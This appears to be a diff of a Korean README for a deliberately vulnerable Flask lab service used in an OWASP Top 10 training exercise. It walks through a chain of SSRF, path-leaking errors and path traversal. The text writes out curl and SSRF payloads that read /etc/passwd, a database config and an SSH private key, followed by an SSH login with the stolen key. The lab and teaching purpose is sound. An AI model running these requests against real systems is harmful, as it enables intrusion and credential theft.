@@ -1,198 +1,164 @@
 # OWASP Top 10 - 취약한 백업 파일 서비스
 
-웹 해킹 학습용 취약한 Flask 애플리케이션입니다. **절대 실제 운영 환경에서 사용하지 마세요.**
+TryHackme easy 랩 <owasp_webhack> 에서 사용된 취약한 Flask 애플리케이션 서비스입니다. **실제 운영 환경에서 사용하지 마세요.**
+
+> **주의**: 이 서비스는 VM 로컬 환경(`127.0.0.1`)에서만 실행되도록 설정되어 있습니다. SSRF 취약점이 있는 웹 앱과 결합하여 내부 네트워크 공격 시나리오를 학습하기 위한 목적입니다.<br>
+
+- 프로젝트 진행: https://velog.io/@jju00/vmware-%EC%84%9C%EB%B2%84-%EC%83%9D%EC%84%B1
+- 2025 owasp: https://nagox.pages.dev/Web/2025-owasp-top-10/
+- github: https://github.com/jju00/owasp10_web
+- THM 문제 주소: 
 
 ## 🎯 학습 목표
 
-이 서비스는 다음 OWASP Top 10 취약점을 학습하기 위해 설계되었습니다:
+이 서비스는 다음 OWASP Top 10 2025 취약점을 학습하기 위해 설계되었습니다:
 
-- **A01:2021 - Broken Access Control** (Path Traversal)
-- **A10:2021 - Server-Side Request Forgery (SSRF)**
-- **취약한 정보 노출** (Debug mode, Internal paths)
+- **[A01:2025 - Broken Access Control](https://nagox.pages.dev/Web/2025-owasp-top-10/)** (Path Traversal)
+- **[A10:2025 - Mishandling of Exceptional Conditions](https://nagox.pages.dev/Web/2025-owasp-top-10/)**
+- **SSRF 트리거용 내부 서비스**
+
+## 💻 VM 환경 권장
+
+격리된 환경에서 안전하게 실습하기 위해 **VMware 가상 머신 사용을 강력히 권장**합니다:
+
+- **VMware 설정 가이드**: [VMware 서버 생성 가이드](https://velog.io/@jju00/vmware-%EC%84%9C%EB%B2%84-%EC%83%9D%EC%84%B1)
+- Ubuntu Server 20.04/22.04 LTS 권장
+- 공유 폴더로 프로젝트 마운트하여 사용
+- 호스트 네트워크와 격리된 NAT 네트워크 구성 
 
 ## 🚀 실행 방법
 
-### systemd 서비스로 등록 (권장 - Linux VM)
+### VM 내부에서 직접 실행 (권장)
 
 ```bash
-# 설치 스크립트 실행
-chmod +x setup.sh
-./setup.sh
-
-# 서비스 시작
-sudo systemctl start owasp-fileservice
-
-# 서비스 상태 확인
-sudo systemctl status owasp-fileservice
-
-# 부팅 시 자동 시작
-sudo systemctl enable owasp-fileservice
-
-# 로그 확인
-sudo journalctl -u owasp-fileservice -f
-```
-
-서비스는 `http://0.0.0.0:8080`에서 실행됩니다.
-
-### 직접 실행 (개발용)
-
-```bash
-# 의존성 설치
+# Python 의존성 설치
 pip3 install -r requirements.txt
+
+# SSH 개인키 생성 (학습용)
+ssh-keygen -t ed25519 -f backup/uploads/owasp10 -N "" -C "owasp10"
 
 # Flask 앱 실행
 python3 app.py
 ```
 
+**서비스 바인딩**: `http://127.0.0.1:8080` (VM 로컬에서만 접근 가능 - app.py에서 수정 가능)
+
+### systemd 서비스로 등록 (선택사항)
+
+```bash
+# systemd 서비스 파일 생성
+sudo tee /etc/systemd/system/owasp-fileservice.service > /dev/null <<EOF
+[Unit]
+Description=OWASP10 Vulnerable File Service
+After=network.target
+
+[Service]
+Type=simple
+User=$USER
+WorkingDirectory=$(pwd)
+Environment="PATH=$PATH"
+ExecStart=/usr/bin/python3 $(pwd)/app.py
+Restart=always
+RestartSec=3
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# 서비스 활성화 및 시작
+sudo systemctl daemon-reload
+sudo systemctl enable owasp-fileservice
+sudo systemctl start owasp-fileservice
+
+# 상태 확인
+sudo systemctl status owasp-fileservice
+```
+
 ## 📍 엔드포인트
 
 ### GET `/`
-- 메인 페이지
-- 서비스 정보 및 사용 가능한 엔드포인트 표시
+- 메인 페이지 (간단한 HTML)
+- 응답 예시:
+  ```html
+  <h1>Club Backup Service</h1>
+  <p>Status: Read-only (maintenance)</p>
+  <p>Endpoints: /upload, /download</p>
+  ```
 
-### GET `/upload`
-- **취약점**: 에러 메시지에서 내부 경로 노출
-- 항상 500 에러를 반환하며, 디버그 정보에 `/opt/backup/uploads/` 경로가 노출됨
+### GET/POST `/upload`
+- **취약점 A10**: 에러 메시지에서 내부 경로 노출
+- 항상 500 에러 반환
+- 임시 파일명(`tmp_랜덤숫자`) 생성 시도 후 실패
+- 응답 예시:
+  ```
+  Error: /mnt/shared/owasp_fileservice/backup/uploads/tmp_847291 upload failed
+  ```
 
 ### GET `/download?path=<filepath>`
-- **취약점**: Path Traversal (경로 검증 없음)
+- **취약점 A01**: Path Traversal (경로 검증 없음)
 - 임의의 파일 다운로드 가능
-- 예시: `/download?path=/opt/backup/uploads/keys/owasp10`
+- 성공 시: HTTP 200 + 파일 다운로드
+- 실패 시: 간단한 텍스트 에러 메시지
+- 예시: `/download?path=/mnt/shared/owasp_fileservice/backup/uploads/owasp10`
 
 ## 🔓 공격 시나리오
 
-### 1단계: 정보 수집
-```bash
-# 메인 페이지 확인
-curl http://localhost:8080/
+> **참고**: 이 서비스는 127.0.0.1에서만 실행되므로, 직접 접근은 VM 내부에서만 가능합니다. 실제 공격 시나리오는 SSRF 취약점을 통해 이루어집니다.
 
-# 업로드 엔드포인트 접근하여 내부 경로 유출
-curl http://localhost:8080/upload
+### 1단계: VM 내부에서 정보 수집 (테스트)
+```bash
+# VM 내부에서 테스트
+curl http://127.0.0.1:8080/
+
+# 업로드 엔드포인트 접근하여 내부 경로 유출 확인
+curl http://127.0.0.1:8080/upload
 ```
 
-**발견**: `/opt/backup/uploads/` 경로 노출
-
-### 2단계: Path Traversal 공격
-```bash
-# 프로젝트 내 파일 구조 확인 (에러 메시지에서 유출된 경로 사용)
-# 예: D:\Projects\owasp10\owasp_fileservice\backup\uploads\ (Windows)
-# 예: /home/user/owasp_fileservice/backup/uploads/ (Linux)
-
-# 개인키 다운로드 (절대 경로 사용)
-curl "http://localhost:8080/download?path=/home/user/owasp_fileservice/backup/uploads/keys/owasp10" -o owasp10.key
-
-# 설정 파일 탈취
-curl "http://localhost:8080/download?path=/home/user/owasp_fileservice/backup/uploads/configs/database.conf"
-
-# 시스템 파일 접근 시도 (Linux)
-curl "http://localhost:8080/download?path=/etc/passwd"
+**결과**: 
 ```
+Error: /mnt/shared/owasp_fileservice/backup/uploads/tmp_123456 upload failed
+```
+→ 내부 저장소 경로 노출됨!
 
-### 3단계: SSRF와 결합
-SSRF 취약점이 있는 다른 서비스(예: VMware 내 80포트 `/admin` 페이지)에서:
+### 2단계: SSRF를 통한 경로 정보 획득 
+실습자는 SSRF 취약점이 있는 웹 앱(80포트)을 통해 접근:
 
 ```bash
-# SSRF를 통해 내부 파일 서비스 접근
-POST http://vulnerable-admin/check
-{
-  "url": "http://fileservice:8080/upload"
-}
-
-# 응답에서 내부 경로 확인 (예: /home/user/owasp_fileservice/backup/uploads/)
-
-# 경로 정보 확인 후 개인키 탈취
-POST http://vulnerable-admin/check
-{
-  "url": "http://fileservice:8080/download?path=/home/user/owasp_fileservice/backup/uploads/keys/owasp10"
-}
+# 실습자 노트북에서 SSRF 웹 앱에 요청
+curl -X POST http://vulnerable-webapp/admin/check \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.0.0.1:8080/upload"}'
 ```
 
-**시나리오**: 
-1. VMware 내 80포트에서 실행되는 `/admin` 페이지에 SSRF 취약점 존재
-2. SSRF를 이용해 내부 네트워크의 파일 서비스(8080) `/upload`에 접근
-3. 에러 응답에서 내부 저장소 경로 획득
-4. `/download` 엔드포인트로 `owasp10` SSH 개인키 탈취
-
-## 🗂️ 프로젝트 구조
-
+**응답**:
 ```
-owasp_fileservice/
-├── app.py                   # Flask 애플리케이션
-├── requirements.txt         # Python 의존성
-├── setup.sh                 # systemd 설치 스크립트
-├── templates/               # HTML 템플릿
-│   ├── index.html
-│   ├── upload_error.html
-│   └── download.html
-└── backup/uploads/          # 백업 파일 저장소
-    ├── keys/
-    │   └── owasp10          # SSH 개인키 (학습용)
-    ├── configs/
-    │   └── database.conf    # DB 설정 (자격증명 포함)
-    └── data/
-        └── backup.log       # 백업 로그
+Error: /mnt/shared/owasp_fileservice/backup/uploads/tmp_789012 upload failed
 ```
 
-**중요**: SSH 개인키는 `backup/uploads/keys/` 디렉토리에 저장됩니다.
+### 3단계: Path Traversal로 개인키 탈취 
+유출된 경로를 이용해 SSH 개인키 다운로드:
 
-## ⚠️ 취약점 상세 분석
+```bash
+# SSRF를 통해 개인키 탈취
+curl -X POST http://vulnerable-webapp/admin/check \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.0.0.1:8080/download?path=/mnt/shared/owasp_fileservice/backup/uploads/owasp10"}' \
+  -o owasp10
 
-### 1. Path Traversal (A01 - Broken Access Control)
+# 권한 설정
+chmod 600 owasp10
 
-**위치**: `/download` 엔드포인트
-
-```python
-# 취약한 코드
-path = request.args.get('path', '')
-if os.path.exists(path):
-    return send_file(path, as_attachment=True)
+# SSH 접속 시도
+ssh -i owasp10 user@target-server
 ```
 
-**문제점**:
-- 사용자 입력에 대한 검증이 전혀 없음
-- 절대 경로 및 상대 경로(`../`) 모두 허용
-- 시스템의 모든 파일에 접근 가능
-
-**안전한 코드 예시**:
-```python
-import os
-from pathlib import Path
-
-ALLOWED_DIR = "/opt/backup/uploads/"
-
-def safe_download(user_path):
-    # 절대 경로로 변환
-    abs_path = os.path.abspath(os.path.join(ALLOWED_DIR, user_path))
-    
-    # 허용된 디렉토리 내부인지 확인
-    if not abs_path.startswith(os.path.abspath(ALLOWED_DIR)):
-        return "Access denied", 403
-    
-    if os.path.isfile(abs_path):
-        return send_file(abs_path, as_attachment=True)
-```
-
-### 2. 정보 노출 (A05 - Security Misconfiguration)
-
-**위치**: `/upload` 엔드포인트
-
-**문제점**:
-- `debug=True` 모드로 실행
-- 상세한 스택 트레이스 노출
-- 내부 파일 경로 노출
-- 시스템 구조 정보 유출
-
-**해결 방법**:
-- 운영 환경에서는 `debug=False` 사용
-- 사용자 친화적인 일반적인 에러 메시지 사용
-- 민감한 정보를 로그에만 기록
-
-### 3. SSRF 취약점 악용
-
-다른 서비스의 SSRF 취약점과 결합하여:
-- 내부 네트워크의 파일 서비스 접근
-- 외부에서 직접 접근할 수 없는 리소스 탈취
-- 인증 우회
+**전체 공격 흐름**:
+1. 공격자 호스트 → SSRF 웹 앱(80포트) 요청
+2. SSRF 웹 앱 → 내부 파일 서비스(127.0.0.1:8080) 접근
+3. 파일 서비스 → 에러 메시지에 내부 경로 노출 (A10)
+4. 공격자 → 유출된 경로로 개인키 탈취 요청
+5. 파일 서비스 → Path Traversal로 임의 파일 반환 (A01)
+6. 공격자 호스트 → 개인키 다운로드 완료!
 
 ## 🛡️ 방어 방법
 
@@ -203,17 +169,14 @@ def safe_download(user_path):
 5. **에러 처리**: 상세한 에러 정보를 사용자에게 노출하지 않음
 6. **최소 권한 원칙**: 애플리케이션을 최소 권한으로 실행
 
-## 📚 참고 자료
+## 🎓 학습 목표 달성을 위해
 
-- [OWASP Top 10 2021](https://owasp.org/Top10/)
-- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
-- [OWASP SSRF](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
-
-## ⚖️ 면책 조항
-
-이 애플리케이션은 **오직 교육 목적**으로만 제작되었습니다. 의도적으로 취약점이 포함되어 있으며, 실제 운영 환경에서는 절대 사용해서는 안 됩니다. 무단으로 타인의 시스템을 공격하는 것은 불법입니다.
+1. VMware로 격리된 환경 구축
+2. SSRF 취약한 웹 앱 구축 (별도 프로젝트)
+3. 이 파일 서비스를 127.0.0.1:8080에서 실행
+4. SSRF → 내부 서비스 접근 → Path Traversal 체인 실습
+5. 방어 기법 학습 및 안전한 코드 작성 연습
 
 ## 📝 라이센스
 
 MIT License - 학습 및 교육 목적으로 자유롭게 사용 가능합니다.
-
